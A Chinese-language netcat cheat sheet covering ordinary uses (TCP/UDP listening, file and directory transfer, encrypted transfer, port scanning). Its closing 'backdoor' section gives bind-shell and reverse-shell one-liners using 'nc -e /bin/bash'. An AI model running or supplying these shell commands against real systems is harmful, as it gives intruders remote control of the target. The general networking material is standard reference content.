# NC用法集锦

## 监听入站连接

```shell
nc -lp 333
```

## 连接远程系统

```shell
nc -v 192.168.101.2 333
```

## 监听UDP端口

```shell
nc -lup 1234
```

## 连接UDP端口

```shell
nc -vu 192.168.101.2 1234
```

## 聊天工具

```shell
nc -lp 333
nc -v 192.168.101.2 333
```

## 拷贝文件

> nc远程拷贝文件没有多大意义，所有远程文件的传输，用的都是ssh,telnet，ftp等等。
>
> 这些文件拷贝工具。
>
> 唯一意义的是：如果远程主机上没有这工具，只能用nc

```shell
nc -lp 333>helloworld.txt

nc -nv 192.168.101.2 333<test.txt
#传输完成后自动结束
nc -nv -q 0 192.168.101.2 333<test.txt

#尝试传输图片和视频
```

## 拷贝目录

```shell
#打包
tar -cvf - 目录名称/|nc -lp 333 -q 1

#解包
nc -nv 192.168.101.2 333|tar -xvf -
```

## 电子取证（信息收集）

```shell
ls -a|nc -lp 333

nc -nv 192.168.101.101 333
```

## 加密传输

```shell
nc -lp 333|mcrypt - -flush -Fbqd -a rijndael-256 -m ecb >文件名

mcrypt --flush -Fbq -a rijndael-256 -m ecb <文件名|nc -nv 192.168.101.101 333 -q 1
```

## 端口扫描

```shell
nc -nvz 192.168.101.101 1-65535
```

## 匿名探测

```shell
#ftp探测
nc -nvz 192.168.101.101 21
```

## 偷听日志

```shell
nc -lp 333>log.txt
```

## 获取后门

```shell
#--------正向后门-------
##本机
nc 192.168.101.101 333
##目标主机
nc -lp 333 -e /bin/bash

#---------反向后门-------
##本机
nc -lp 333
##目标主机
nc 192.168.101.2 333 -e /bin/bash
```

